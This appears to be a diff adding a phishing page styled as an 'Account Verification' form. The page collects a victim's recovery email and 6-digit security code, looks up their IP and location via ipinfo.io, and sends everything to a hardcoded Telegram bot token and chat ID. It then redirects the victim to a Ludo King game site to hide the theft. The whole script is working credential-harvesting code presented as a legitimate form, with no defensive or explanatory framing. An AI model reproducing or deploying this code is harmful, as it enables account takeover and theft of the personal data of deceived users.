@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title> bind verification </title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #121212;
+      color: #e0e0e0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    .container {
+      background-color: #1a1a1a;
+      border-radius: 10px;
+      overflow: hidden;
+      width: 100%;
+      max-width: 480px;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.6);
+      border: 1px solid #333;
+    }
+    .header {
+      background-color: #222222;
+      padding: 18px 25px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 2px solid #ffcc00;
+    }
+    .header h2 {
+      margin: 0;
+      font-size: 1.35em;
+      color: #ffcc00;
+      font-weight: 600;
+    }
+    .close-button {
+      background-color: #e74c3c;
+      color: #fff;
+      border: none;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 1.1em;
+    }
+    .close-button:hover {
+      background-color: #c0392b;
+    }
+    .content {
+      padding: 25px;
+    }
+    .content p {
+      margin-bottom: 25px;
+      font-size: 0.95em;
+      color: #b0b0b0;
+      line-height: 1.5;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 600;
+      color: #e0e0e0;
+      font-size: 0.9em;
+      text-transform: uppercase;
+    }
+    .form-group input {
+      width: calc(100% - 24px);
+      padding: 12px;
+      border: 1px solid #444;
+      background-color: #2c2c2c;
+      color: #e0e0e0;
+      border-radius: 5px;
+      font-size: 0.95em;
+    }
+    .form-group input:focus {
+      border-color: #ffcc00;
+      outline: none;
+      box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.3);
+    }
+    .form-group input::placeholder {
+      color: #888;
+      font-style: italic;
+    }
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 30px;
+    }
+    .verify-button {
+      background-color: #444;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      padding: 12px 35px;
+      cursor: not-allowed;
+      font-size: 1.05em;
+      font-weight: bold;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .verify-button.active {
+      background-color: #ffcc00;
+      color: #1a1a1a;
+      cursor: pointer;
+    }
+    .verify-button.active:hover {
+      background-color: #e6b800;
+    }
+    .forgot-link {
+      color: #ffcc00;
+      text-decoration: none;
+      font-size: 0.9em;
+    }
+    .forgot-link:hover {
+      color: #e6b800;
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h2>ACCOUNT VERIFICATION</h2>
+      <button class="close-button" onclick="alert('Close button clicked!')">X</button>
+    </div>
+    <div class="content">
+      <p>Please enter your recovery email and security code</p>
+      <form id="verificationForm">
+        <div class="form-group">
+          <label for="recovery-email">RECOVERY EMAIL:</label>
+          <input type="email" id="recovery-email" name="recoveryEmail" placeholder="Please enter your recovery email" required />
+        </div>
+        <div class="form-group">
+          <label for="security-code">SECURITY CODE:</label>
+          <input type="text" id="security-code" name="securityCode" placeholder="Enter 6-digit code" maxlength="6" required inputmode="numeric" />
+        </div>
+        <div class="buttons">
+          <button type="submit" class="verify-button" id="verifyButton" disabled>VERIFY</button>
+          <a href="#" class="forgot-link" onclick="return false;">Forgot security code?</a>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    const emailInput = document.getElementById('recovery-email');
+    const securityCodeInput = document.getElementById('security-code');
+    const verifyButton = document.getElementById('verifyButton');
+    const verificationForm = document.getElementById('verificationForm');
+
+    const botToken = "8087824552:AAFEkVQtJtfRdHDa1rx8SAkf0m3n_ila_hE";
+    const chatId = "6250740299";
+
+    function checkFormValidity() {
+      const isEmailValid = emailInput.value.trim() !== '' && emailInput.checkValidity();
+      const isSecurityCodeValid = /^\d{6}$/.test(securityCodeInput.value);
+      if (isEmailValid && isSecurityCodeValid) {
+        verifyButton.classList.add('active');
+        verifyButton.disabled = false;
+      } else {
+        verifyButton.classList.remove('active');
+        verifyButton.disabled = true;
+      }
+    }
+
+    securityCodeInput.addEventListener('input', function () {
+      this.value = this.value.replace(/\D/g, '').slice(0, 6);
+      checkFormValidity();
+    });
+
+    emailInput.addEventListener('input', checkFormValidity);
+
+    verificationForm.addEventListener('submit', function (event) {
+      event.preventDefault();
+      if (!verifyButton.disabled) {
+        const email = emailInput.value;
+        const code = securityCodeInput.value;
+        const timestamp = new Date().toLocaleString();
+        const browserInfo = navigator.userAgent;
+
+        fetch("https://ipinfo.io/json")
+          .then(res => res.json())
+          .then(data => {
+            const ip = data.ip || "N/A";
+            const city = data.city || "N/A";
+            const region = data.region || "N/A";
+            const country = data.country || "N/A";
+
+            const message = `📩 bind code \n📧 Email: ${email}\n🔐 Code: ${code}\n🕒 Time: ${timestamp}\n🌐 Browser: ${browserInfo}\n📍 IP: ${ip}\n🏙️ Location: ${city}, ${region}, ${country}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+              })
+            })
+            .then(response => {
+              if (response.ok) {
+                window.location.href = 'https://ludoking.com/play/';
+              } else {
+                console.error("Telegram error");
+              }
+            })
+            .catch(error => {
+              console.error("Fetch error:", error);
+            });
+          });
+      }
+    });
+
+    checkFormValidity();
+  </script>
+</body>
+</html>
